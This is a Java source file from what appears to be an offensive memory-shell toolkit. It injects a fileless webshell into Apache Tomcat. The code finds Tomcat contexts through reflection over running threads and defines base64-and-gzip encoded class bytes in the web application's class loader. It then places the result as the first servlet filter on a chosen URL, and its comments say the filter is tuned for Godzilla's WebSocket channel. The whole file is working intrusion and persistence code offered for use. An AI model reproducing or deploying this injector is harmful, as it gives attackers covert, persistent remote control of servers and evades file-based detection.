package com.reajason.javaweb.memshell.injector.tomcat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author pen4uin, ReaJason
 */
public class TomcatRawWsInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public String getHelperBase64String() {
        return "{{helperBase64Str}}";
    }

    public TomcatRawWsInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        boolean injected = false;
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                    injected = true;
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        // 一个 context 都没注入成功时不锁存，让后续请求触发重试（inject 内 findFilterDef 幂等，重复执行安全）
        ok = injected;
        System.out.println(msg);
    }

    /**
     * org.apache.catalina.core.StandardContext
     * /usr/local/tomcat/server/lib/catalina.jar
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            try {
                String threadName = thread.getName();
                if (threadName.contains("ContainerBackgroundProcessor")) {
                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getThreadTarget(thread), "this$0"), "children");
                    for (Object value : childrenMap.values()) {
                        Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                        contexts.addAll(children.values());
                    }
                } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
                    Object proto = getFieldValue(getFieldValue(getFieldValue(getThreadTarget(thread), "this$0"), "handler"), "proto");
                    Object engine = getFieldValue(getFieldValue(getFieldValue(getFieldValue(proto, "adapter"), "connector"), "service"), "engine");
                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(engine, "children");
                    for (Object value : childrenMap.values()) {
                        Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                        contexts.addAll(children.values());
                    }
                } else if (thread.getContextClassLoader() != null) {
                    String name = thread.getContextClassLoader().getClass().getSimpleName();
                    if (name.matches(".+WebappClassLoader")) {
                        Object resources = getFieldValue(thread.getContextClassLoader(), "resources");
                        // need WebResourceRoot not DirContext
                        if (resources != null && resources.getClass().getName().endsWith("Root")) {
                            Object context = getFieldValue(resources, "context");
                            contexts.add(context);
                        }
                    }
                }
            } catch (Throwable ignored) {
                // JDK16+ 单个线程的反射可能抛 InaccessibleObjectException/NoSuchFieldException，
                // 跳过它继续找其它入口，单个线程失败不能终止整个发现流程
            }
        }
        return contexts;
    }

    /**
     * JDK 21 把 Thread.target 挪进了 FieldHolder.task：先按老字段名取，取不到再走 holder。
     */
    private Object getThreadTarget(Thread thread) throws Exception {
        try {
            return getFieldValue(thread, "target");
        } catch (NoSuchFieldException e) {
            Object holder = getFieldValue(thread, "holder");
            return holder == null ? null : getFieldValue(holder, "task");
        }
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        defineHelper(classLoader);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    /**
     * helper 必须先于 shell 构造完成 define；shell 无参构造会按类名自行解析它。
     * 后缀与 RawWsHelperNames.HELPER_SUFFIX 一致，注入器运行时不能依赖 api jar。
     */
    @SuppressWarnings("all")
    private Class<?> defineHelper(ClassLoader classLoader) throws Exception {
        String helperName = getClassName() + "$RawWsHelper";
        try {
            return classLoader.loadClass(helperName);
        } catch (Throwable ignored) {
        }
        byte[] helperBytes = gzipDecompress(decodeBase64(getHelperBase64String()));
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
                String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        return (Class<?>) defineClass.invoke(classLoader, helperName, helperBytes, 0, helperBytes.length);
    }

    @SuppressWarnings("all")
    public void inject(Object context, Object shell) throws Exception {
        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
            return;
        }
        Object filterDef;
        Object filterMap;
        Class<?> filterMapClass;
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        try {
            // tomcat v8+
            filterDef = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMapClass = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap");
            filterMap = filterMapClass.newInstance();
        } catch (Exception e2) {
            // tomcat v5+
            filterDef = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
            filterMapClass = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap");
            filterMap = filterMapClass.newInstance();
        }

        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
        try {
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
        } catch (Exception e) {
            invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{shell.getClass()});
        }
        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
        boolean supportMultiplePatterns;
        try {
            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
            supportMultiplePatterns = true;
        } catch (Exception e) {
            // tomcat v5
            invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
            supportMultiplePatterns = false;
        }
        if (supportMultiplePatterns) {
            // Godzilla 4.15 内置 WebSocket 通道会在 URL 后追加 /<pass>，补一条前缀映射，
            // 让 4.15 与 GzWebsocket 插件（URL 原样）共用同一个过滤器入口
            String suffixUrlPattern = getSuffixUrlPattern(getUrlPattern());
            if (suffixUrlPattern != null) {
                invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{suffixUrlPattern});
            }
        }

        // addFilterMapFirst
        Object[] filterMaps = (Object[]) invokeMethod(context, "findFilterMaps", null, null);
        Object[] results = (Object[]) Array.newInstance(filterMapClass, filterMaps.length + 1);
        results[0] = filterMap;
        System.arraycopy(filterMaps, 0, results, 1, filterMaps.length);
        try {
            // Tomcat5
            setFieldValue(context, "filterMaps", results);
        } catch (Exception e) {
            setFieldValue(getFieldValue(context, "filterMaps"), "array", results);
        }

        Constructor filterConfigConstructor;
        filterConfigConstructor = contextClassLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
        filterConfigConstructor.setAccessible(true);
        Object filterConfig = filterConfigConstructor.newInstance(context, filterDef);
        Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
        filterConfigs.put(getClassName(), filterConfig);
    }

    @Override
    public String toString() {
        return msg;
    }

    /**
     * 4.15 的 WebSocket 通道连接路径是 {@code <urlPattern>/<pass>}，需要一条前缀映射兜住；
     * 已经覆盖子路径的（{@code /*}、{@code /x/*}）和扩展名映射不需要补。
     */
    static String getSuffixUrlPattern(String urlPattern) {
        if (urlPattern == null || urlPattern.isEmpty() || urlPattern.startsWith("*.") || urlPattern.endsWith("*")) {
            return null;
        }
        return urlPattern.endsWith("/") ? urlPattern + "*" : urlPattern + "/*";
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }


    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        Field field = getField(obj, name);
        field.setAccessible(true);
        return field.get(obj);
    }


    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
